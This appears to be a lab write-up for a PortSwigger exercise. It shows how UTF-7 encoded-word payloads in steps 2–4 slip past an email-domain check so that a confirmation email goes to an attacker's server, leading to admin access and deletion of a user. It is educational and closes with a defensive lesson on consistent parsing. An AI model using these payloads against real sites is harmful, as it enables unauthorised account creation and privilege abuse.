# Email Validation Bypass via UTF-7 Encoding

## Vulnerability



**Email validation and parsing discrepancy**



The application validates the email address using one interpretation, while the email processing component interprets UTF-7 encoded data 
differently.



This inconsistency allows an attacker to bypass the allowed-domain restriction and make the application send a confirmation email to an 
attacker-controlled address.



---



## Objective



- Bypass the `ginandjuice.shop` email-domain restriction.

- Receive the confirmation email on the Exploit Server.

- Activate the account.

- Access the admin panel.

- Delete the user `carlos`.

---




## 1. Identify the Registration Restriction




First, attempt to register using:



```text

foo@exploit-server.net

```



The application rejects the request because the email domain must be:

```text

ginandjuice.shop


```

This confirms that the application performs server-side email-domain validation.

---



## 2. Test Encoded-Word Formats



Try ISO-8859-1 encoded-word syntax:



```text

=?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop

```



Then try UTF-8:


```text

=?utf-8?q?=61=62=63?=foo@ginandjuice.shop


```


Both attempts are blocked with:



```text

Registration blocked for security reasons.



```


This suggests that the application detects these common encoded-word manipulation attempts.

---




## 3. Test UTF-7 Encoding



Try:


```text

=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop

```



This encoding is not detected by the application's security validation.



This indicates a discrepancy between how the application validates the input and how the email processing component later interprets it.


---


## 4. Exploit the Discrepancy


Use the following payload:



```text

=?utf-7?q?attacker&AEA-exploit-0a1700ca031f93fb8177a13a01130073.exploit-server.net&ACA-?=@ginandjuice.shop

```


The important part is the UTF-7 encoded data:

```text

&AEA-

```


which represents:



```text
@

```




and:




```text

&ACA-

```


which represents a space.




The application validation still sees an address containing:

```text

@ginandjuice.shop

```


while the email parser interprets the encoded portion differently.



As a result, the confirmation email is delivered to the attacker-controlled Exploit Server address.




---



## 5. Confirm the Account



Open the lab's **Email client**.



A registration confirmation email should be available.




Open it and click the confirmation link to activate the account.



---


## 6. Access the Admin Panel


Log in using the newly registered account.

Navigate to:


```text

Admin panel


```


Then delete:



```text

carlos

```


---


## Result




The lab is solved.


---




## Key Takeaway


The core issue is not simply UTF-7 encoding.



The real vulnerability is a **parsing discrepancy between different components**:





```text

Attacker-controlled input

        ↓


Application validation
        ↓

Accepted as @ginandjuice.shop
        ↓

Email processing
        ↓



UTF-7 decoded differently

        ↓

Confirmation sent to attacker-controlled address


```


### Security Concept

> Always ensure that security validation and downstream processing use the same canonical representation of user-controlled input.




### Vulnerability



**Inconsistent input validation / parsing discrepancy**


### PortSwigger


[https://portswigger.net/web-security/email-address-validation-bypass](https://portswigger.net/web-security/email-address-validation-bypass)
